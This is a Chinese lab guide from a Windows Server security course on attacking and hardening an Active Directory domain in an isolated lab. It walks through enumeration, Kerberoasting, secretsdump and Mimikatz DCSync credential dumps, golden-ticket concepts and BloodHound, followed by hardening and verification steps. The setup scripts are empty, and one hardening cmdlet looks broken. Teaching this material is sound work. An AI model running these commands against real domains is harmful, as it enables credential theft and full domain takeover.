---
title: 实验六：Windows域环境渗透与提权
slug: /windows-server-security/lab6-domain-privesc
---

# 实验六：Windows域环境渗透与提权

# 实验六：Windows域环境渗透与提权

> 对应章节：项目六 Windows域管理
实验目标：掌握域控搭建与域信息收集、Kerberoasting、DCSync/黄金票据等核心攻击链，并完成相应的加固验证（Protected Users、krbtgt 密码、最小权限服务账户等）
预计用时：150分钟
难度等级：⭐⭐⭐⭐（高级）
> 

---

# 第一部分：前置知识点

## 1. Active Directory域服务核心概念

### 1.1 AD DS逻辑结构

```
Active Directory的逻辑层级结构：

森林（Forest）
│   • 最高级别的AD容器
│   • 包含一个或多个域树
│   • 森林间有双向传递信任
│
├── 域树（Tree）
│   │   • 共享连续的DNS命名空间
│   │   例：corp.local → sub.corp.local
│   │
│   └── 域（Domain）
│       │   • 基本管理单元
│       │   例：corp.local
│       │
│       ├── 组织单元（OU）
│       │   • 容器对象，用于组织用户/计算机/组
│       │   • 可链接GPO实现策略下发
│       │   • 例：OU=员工,DC=corp,DC=local
│       │   │
│       │   ├── 用户（User）
│       │   ├── 计算机（Computer）
│       │   └── 组（Group）
│       │
│       └── 信任关系（Trust）
│           • 域间信任：允许一个域的用户访问另一个域的资源
│           • 单向信任 / 双向信任
│           • 可传递信任 / 不可传递信任
```

### 1.2 域控制器（DC）核心组件

```
域控制器上运行的核心服务和数据库：

┌─────────────────────────────────────────────────┐
│               域控制器（DC）                       │
│                                                   │
│  ┌──────────────────────────────────────┐         │
│  │  NTDS.dit（AD数据库文件）            │         │
│  │  • 存储所有域对象                    │         │
│  │  • 用户账户和密码哈希                │         │
│  │  • 组策略对象（GPO）                 │         │
│  │  • 计算机账户和DNS记录               │         │
│  └──────────────────────────────────────┘         │
│                                                   │
│  ┌──────────────────────────────────────┐         │
│  │  关键服务                              │         │
│  │  • DNS Server（AD必需依赖）          │         │
│  │  • Kerberos KDC（认证服务）          │         │
│  │  • LDAP（目录查询服务）              │         │
│  │  • NetLogon（域登录验证）            │         │
│  │  • SYSVOL（组策略文件共享）          │         │
│  └──────────────────────────────────────┘         │
└─────────────────────────────────────────────────┘
```

### 1.3 域中存储的关键数据

```
NTDS.dit中存储的高价值数据（域渗透的终极目标）：

┌──────────────────┬─────────────────────────────────────┐
│ 数据类型         │ 泄露后果                             │
├──────────────────┼─────────────────────────────────────┤
│ 用户密码哈希     │ 可离线破解所有域用户密码             │
│ 计算机账户密码   │ 可伪造任意计算机身份                │
│ krbtgt哈希       │ 可伪造黄金票据（任意用户TGT）       │
│ 服务账户密码     │ 可Kerberoasting后接管服务            │
│ GPO配置          │ 可篡改全域安全策略                    │
│ 委派配置         │ 可获取额外权限                       │
│ DNS记录          │ 可伪造DNS响应（DNS欺骗）           │
└──────────────────┴─────────────────────────────────────┘
```

---

## 2. Kerberos认证协议精讲

### 2.1 Kerberos认证流程

```
Kerberos是域环境的默认认证协议，基于"票据（Ticket）"机制：

用户登录                     KDC（域控制器上）                    访问资源
┌─────┐           ┌──────────────┐           ┌──────────────┐           ┌─────┐
│ 用户 │──AS请求──►│    AS        │           │    TGS       │           │ 文件 │
│     │           │ 认证服务     │           │ 票据授予服务  │           │ 服务器│
│     │ ◄─TGT─────│              │           │              │           │     │
│     │           │  TGT（黄金票据）│           │              │           │     │
│     │           │  可访问TGS   │           │              │           │     │
├─────┤           └──────────────┘           └──────────────┘           └─────┘
│     │  ──TGS-REQ(TGT)──────────────────────────────────────────────────────────►
│     │  ◄─Service Ticket───────────────────────────────────────────────────────────
│     │
│     │  ──AP-REQ(Service Ticket)─────────────────────────────────────────────────►
│     │
│     │  ◄─服务响应────────────────────────────────────────────────────────────────

关键票据说明：
TGT（Ticket Granting Ticket）：
  • 由AS颁发，证明用户已通过初始认证
  • 有效期通常10小时
  • ⚠️ 获取krbtgt哈希可伪造任意TGT → 黄金票据攻击

Service Ticket（服务票据）：
  • 由TGS颁发，证明用户有权访问特定服务
  • 绑定特定SPN（Service Principal Name）
  • ⚠️ 可离线破解 → Kerberoasting攻击
```

### 2.2 Kerberos攻击方法概览

```
┌─────────────────────────────────────────────────────────────────┐
│                    Kerberos 攻击面                              │
├──────────────────┬──────────────────────────────────────────────┤
│ 攻击方法         │ 原理与利用条件                         │
├──────────────────┼──────────────────────────────────────────────┤
│ Kerberoasting   │ 请求服务票据(TGS) → 离线破解密码        │
│                  │ 条件：普通域用户即可（需SPN的账户）      │
│                  │ 本实验重点 ✓                           │
├──────────────────┼──────────────────────────────────────────────┤
│ 黄金票据         │ 获取krbtgt哈希 → 伪造任意用户TGT      │
│ (Golden Ticket)  │ 条件：需要域管权限（DCSync）          │
│                  │ 效果：持久化域管权限                    │
├──────────────────┼──────────────────────────────────────────────┤
│ 白银票据         │ 获取服务账户哈希 → 伪造特定服务票据   │
│ (Silver Ticket)  │ 条件：需要服务账户的NTLM Hash         │
│                  │ 效果：以该服务身份访问资源              │
├──────────────────┼──────────────────────────────────────────────┤
│ AS-REP Roasting │ 请求不需预认证的用户票据 → 离线破解     │
│                  │ 条件：账户设置了"Do not require Kerberos │
│                  │        preauthentication"属性               │
└──────────────────┴──────────────────────────────────────────────┘
```

---

## 3. DCSync攻击详解

### 3.1 DCSync原理

```
DCSync（目录复制服务同步）是域控之间同步AD数据库的合法机制。
攻击者利用DCSync权限伪装为域控，从目标域控复制所有用户密码哈希。

正常域控同步：
  DC01 ─── DCReplicaSync ───► DC02
  (请求复制所有用户哈希)         (返回完整数据)

DCSync攻击：
  攻击者 ── DCSync ───► DC01
  (伪造域控请求复制)     (返回所有用户哈希！)

所需权限：
  • Replicating Directory Changes
  • Replicating Directory Changes All
  • 或直接属于 Domain Admins / Enterprise Admins

导出内容：
  • 所有域用户的NTLM Hash（包括Administrator和krbtgt）
  • krbtgt哈希 → 用于伪造黄金票据
  • 用户密码历史记录
```

### 3.2 黄金票据攻击链

```
获取krbtgt哈希 → 伪造TGT → 获取域管权限 → 持久化访问

详细步骤：
┌─────────────────┐
│ 1. 获取krbtgt哈希 │
│    DCSync攻击      │
│    secretsdump     │
│    Mimikatz:       │
│    lsadump::dcsync│
└────────┬────────┘
         ▼
┌─────────────────┐
│ 2. 伪造黄金票据   │
│    ticketer.py     │
│    需要参数：      │
│    • 域SID        │
│    • 域名          │
│    • krbtgt NTLM   │
│    • 伪造用户名    │
└────────┬────────┘
         ▼
┌─────────────────┐
│ 3. 使用票据认证   │
│    psexec/wmiexec  │
│    访问域控C$     │
│    导出AD数据      │
│    修改域策略      │
└─────────────────┘

防御：修改krbtgt密码两次（使旧票据失效）+ Protected Users组
```

> **实验关键提示**：本实验是域渗透的核心实验，涵盖信息收集、Kerberoasting、DCSync、BloodHound 与黄金票据等关键技术。核心目标是理解“从普通域用户到域管”的路径与每一步的防御措施。实验结束后需更改 krbtgt 密码、启用 Protected Users 等加固项来切断攻击链。
> 

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐                                    ┌─────────────────────┐
│    Kali Linux       │              NAT模式                │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────► │    2025（域控）      │
│  IP: 192.168.1.10   │         192.168.1.0/24              │  IP: 192.168.1.20   │
└─────────────────────┘                                    │  域名: corp.local    │
                                                            └─────────────────────┘
```

### 1.2 靶机环境详细配置

> **注意**：本实验需要一台 **域控制器（DC）** 。建议使用Windows Server 2025，搭建单域单控环境。如资源有限，也可在一台服务器上同时充当域控和成员服务器。
> 

**虚拟机设置**：

| 项目 | 配置 |
| --- | --- |
| 内存 | 4 GB（域控建议不低于2GB） |
| 网络适配器 | NAT模式 |
| 快照 | 实验前创建快照（命名：实验六-初始状态） |

**域控初始化脚本**（管理员PowerShell执行）：

# ============================================

**域环境配置脚本**（重启后以域管理员 `CORP\Administrator` 登录执行）：

# ============================================

**攻击机配置**：

# 1. 配置Kali的DNS指向域控

---

## 二、实验步骤

### 阶段一：域信息收集

**步骤1：基本域信息枚举**

```
# 使用Nmap扫描域控开放端口
nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 192.168.1.20

# 预期关键端口（示例）：
# 53/tcp   open  domain       (DNS)
# 88/tcp   open  kerberos-sec (Kerberos)
# 389/tcp  open  ldap         (LDAP)
# 445/tcp  open  microsoft-ds (SMB)
# 636/tcp  open  ldapssl      (LDAPS)
# 3268/tcp open  ldap         (GC)
```

> **知识关联**：对应讲义中”域控制器的部署准备条件”——域控需要DNS服务（53）、Kerberos认证（88）、LDAP（389/636）等端口。
> 

**步骤2：LDAP匿名绑定枚举**

```
# 使用ldapsearch匿名枚举域信息（是否成功取决于DC是否允许匿名绑定）
ldapsearch -x -H ldap://192.168.1.20 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# 使用windapsearch（如已安装）
git clone https://github.com/ropnop/windapsearch.git
cd windapsearch
python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 -U
python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 -G
python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 --computers
```

**步骤3：使用CrackMapExec进行域枚举**

```
# 使用已获取的域用户凭据进行枚举（示例）
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --users
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --groups
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --computers
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --domain-info
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --password-policy
```

> **知识关联**：对应讲义中”域渗透常见路径”——信息收集是域渗透的第一步，包括枚举域用户、组、计算机、密码策略等。
> 

---

### 阶段二：Kerberoasting攻击

**步骤4：请求服务票据（TGS）**

```
# 使用Impacket的GetUserSPNs脚本（需要一个有效的域用户凭据）
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request

# 将哈希保存到文件
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request -outputfile /tmp/tgs_hashes.txt
```

> **知识关联**：对应讲义中”Kerberos常见攻击 - Kerberoasting”——攻击者使用普通域用户权限请求服务票据后，离线暴力破解服务账户密码。服务账户通常使用弱密码且密码不定期更换。
> 

**步骤5：离线破解服务票据**

```bash
# 使用Hashcat破解Kerberos TGS票据
# 模式：13100 = Kerberos 5 TGS-REP etype 23
hashcat -m 13100 /tmp/tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force

# 或使用John the Ripper
john --format=krb5tgs /tmp/tgs_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 预期输出（破解弱密码服务账户）：
# MSSQLSvc/dc01.corp.local:1433::CORP:sqlsvc:a5f5...:Service@2024
# HTTP/www.corp.local::CORP:websvc:a5f5...:Service@2024
```

**步骤6：使用破解的凭据进行域渗透**

# 使用破解出的服务账户密码进行PTT攻击 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/sqlsvc:‘Service@2024’@192.168.1.20# 如果服务账户有特殊权限，可能直接导出域哈希# 使用impacket的smbexec获取shell /usr/share/doc/python3-impacket/examples/smbexec.py corp.local/sqlsvc:‘Service@2024’@192.168.1.20

---

### 阶段三：DCSync攻击导出域哈希

**步骤7：检查DCSync所需权限**

```bash
# DCSync需要以下权限之一：
# - Replicating Directory Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
# - Replicating Directory Changes All (1131f6ab-9c07-11d1-f79f-00c04fc2dcd2)
# - Domain Admins
# - Enterprise Admins
# - Administrators

# 检查zhangsan是否有Replicating Directory Changes权限
# 使用Get-ACL查看
```

**步骤8：使用Mimikatz执行DCSync**

在已获取zhangsan会话的靶机上执行：

```bash
cd C:\Tools
mimikatz.exe

# 获取调试权限
privilege::debug

# DCSync攻击：模拟域控从其他域控复制，导出所有用户哈希
lsadump::dcsync /domain:corp.local /all /csv

# 导出特定用户哈希
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /user:krbtgt

# 预期输出（部分）：
# User : Administrator
# Domain : CORP
# RID  : 000001f4 (500)
# LM   :
# NTLM : aad3b435b51404eeaad3b435b51404ee:8a3de542fcd2c13dd6a8f56e034a73be
#
# User : krbtgt
# Domain : CORP
# RID  : 000001f6 (502)
# LM   :
# NTLM : aad3b435b51404eeaad3b435b51404ee:4a8b9...   ← krbtgt哈希用于伪造黄金票据
```

> **知识关联**：对应讲义中”Kerberos常见攻击 - 黄金票据”——获取krbtgt哈希后可伪造任意用户的TGT，实现持久化域管权限。
> 

**步骤9：使用Impacket远程DCSync**

# 使用已获取的域用户凭据远程执行DCSync /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:‘P@ssw0rd123’@192.168.1.20 -dc-ip 192.168.1.20 -just-dc# 导出结果包含所有域用户的NTLM哈希# 保存到文件 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:‘P@ssw0rd123’@192.168.1.20 -dc-ip 192.168.1.20 -just-dc > /tmp/domain_hashes.txt

---

### 阶段四：BloodHound域攻击路径分析

**步骤10：收集域信息并导入BloodHound**

# 使用SharpHound收集域信息（需要域用户凭据）

**步骤11：在BloodHound中分析攻击路径**

```
# 在BloodHound中执行以下预定义查询：
# 1. Find Shortest Path to Domain Admins → 分析普通用户到域管的最短路径
# 2. Find All Domain Admins → 列出所有域管理员
# 3. Find Users with DCSync Rights → 找出有DCSync权限的用户
# 4. Find Kerberoastable AS-REP Roastable Users → 找出可被Kerberoasting的用户
# 5. Find Policies where DOMAIN USERS have GenericAll → 找出域用户有完全控制的GPO
```

> **知识关联**：对应讲义中”BloodHound可视化AD攻击路径分析”——BloodHound基于图数据库分析AD中的攻击路径，可视化展示提权路径。
> 

---

### 阶段五：域安全加固与验证

**步骤12：修复域安全配置**

在域控上执行：

```powershell
# 1. 将高权限账户加入Protected Users组
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","itadmin"
# Protected Users组成员：
# - 不能使用NTLM认证
# - 凭据不会被缓存
# - 必须使用Kerberos智能卡登录（Windows Server 2012 R2+）

# 2. 启用Kerberos AES加密
# 通过GPO配置：
# gpedit.msc → 计算机配置 → Windows设置 → 安全设置 → 本地策略 → 安全选项
#   网络安全: 配置Kerberos允许的加密类型 → 启用，勾选AES-256

# 3. 更改krbtgt密码（防御黄金票据）
# 创建新密码
$newKrbtgtPassword = ConvertTo-SecureString "NewKrbtgt@2024!VeryLong" -AsPlainText -Force
Set-ADAccountPassword -Identity "krbtgt" -NewPassword $newKrbtgtPassword -Reset
# 注意：需要在域控上操作两次并等待复制，使旧票据失效

# 4. 限制DCSync权限
# 移除不必要的Replicating Directory Changes权限
# 仅保留Domain Admins和Enterprise Admins的DCSync权限

# 5. 审核域管变更
# 在GPO中启用以下审核策略：
# 审核策略 → 审核目录服务访问 → 成功，失败
# 审核策略 → 审核帐户管理 → 成功

# 6. 禁用弱密码服务账户，改为使用组托管服务账户（gMSA）
# 将服务账户密码改为强密码
Set-ADAccountPassword -Identity "sqlsvc" -Reset
New-ADAccountPassword -Identity "websvc" -Reset

# 验证
Get-ADGroupMember -Identity "Protected Users"
Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName}
```

**步骤13：验证加固效果**

```
# 1. 验证Protected Users组生效（示例：该组成员应限制/拒绝NTLM）
crackmapexec smb 192.168.1.20 -d corp.local -u itadmin -p 'P@ssw0rd123'

# 2. 验证Kerberoasting效果（强密码后破解应失败）
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request -outputfile /tmp/tgs_new.txt
hashcat -m 13100 /tmp/tgs_new.txt /usr/share/wordlists/rockyou.txt --force

# 3. 验证DCSync权限被限制（移除权限后应失败）
/usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:'P@ssw0rd123'@192.168.1.20 -just-dc
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | 域信息收集结果 | 域名、域用户列表、域组列表、密码策略 |
| 2 | Kerberoasting过程 | TGS票据哈希、破解结果 |
| 3 | DCSync攻击结果 | 导出的域用户哈希列表（脱敏处理） |
| 4 | BloodHound分析 | 攻击路径截图、关键发现 |
| 5 | 加固配置清单 | Protected Users、krbtgt密码、DCSync权限等 |

### 思考题

1. Kerberoasting攻击需要什么前提条件？为什么服务账户通常是攻击目标？
2. DCSync攻击为什么如此危险？获取krbtgt哈希后如何伪造黄金票据？
3. Protected Users组提供哪些保护？它有什么使用限制？
4. 为什么krbtgt密码需要修改两次？仅修改一次有什么风险？
5. 在域环境中，最小权限原则应如何应用于服务账户？

---

## 四、实验清理

```powershell
# 1. 如果要保留域环境，只删除测试用户和组
Remove-ADUser -Identity "zhangsan" -Confirm:$false
Remove-ADUser -Identity "lisi" -Confirm:$false
Remove-ADUser -Identity "wangwu" -Confirm:$false
Remove-ADUser -Identity "sqlsvc" -Confirm:$false
Remove-ADUser -Identity "websvc" -Confirm:$false
Remove-ADGroup -Identity "IT部门" -Confirm:$false
Remove-ADGroup -Identity "销售部门" -Confirm:$false
Remove-ADGroup -Identity "财务部门" -Confirm:$false

# 2. 如果要完全清除域环境，恢复快照

# 3. 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

> **免责声明**：本实验仅用于授权的安全教学环境。对任何未授权的Active Directory域环境进行渗透测试属于严重违法行为。DCSync攻击会导出域中所有用户的密码哈希，操作后果严重，请确保仅在隔离的实验环境中执行。
>